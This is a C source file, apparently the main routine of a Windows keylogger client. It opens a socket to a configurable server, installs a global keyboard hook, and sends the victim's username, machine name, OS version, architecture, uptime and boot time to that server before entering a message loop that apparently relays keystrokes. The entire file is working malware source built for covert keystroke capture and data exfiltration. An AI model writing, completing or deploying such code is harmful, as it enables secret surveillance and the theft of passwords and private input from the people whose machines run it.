#include "include.h"

int main(void) {
    wchar_t server_ip[IP_LEN] = L"127.0.0.1";
    u_short server_port = 8080;
    HHOOK hook = NULL;
    int exit_status = EXIT_FAILURE;
    WSADATA wsaData;

    _setmode(_fileno(stdout), _O_U16TEXT);
    _setmode(_fileno(stderr), _O_U16TEXT);
    _setmode(_fileno(stdin), _O_U16TEXT);

    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fwprintf(stderr, L"Error: WSAStartup Error. Error Code: %d\n", WSAGetLastError());
        goto cleanup;
    }

    if (get_server_config(server_ip, &server_port) == EXIT_FAILURE) {
        goto cleanup;
    }

    sock = connect_to_server(server_ip, server_port);
    if (sock == INVALID_SOCKET) {
        goto cleanup;
    }

    hook = hook_the_keyboard();
    if (!hook) {
        goto cleanup;
    }

    send_username_to_server(sock);
    send_fqdn_to_server(sock);
    send_os_version_to_server(sock);
    send_os_architecture_to_server(sock);
    send_uptime_to_server(sock);
    send_boot_time_to_server(sock);

    run_message_loop();
    exit_status = EXIT_SUCCESS;

cleanup:
    if (sock != INVALID_SOCKET) {
        closesocket(sock);
    }

    if (hook != NULL) {
        UnhookWindowsHookEx(hook);
    }

    WSACleanup();

    return exit_status;
}
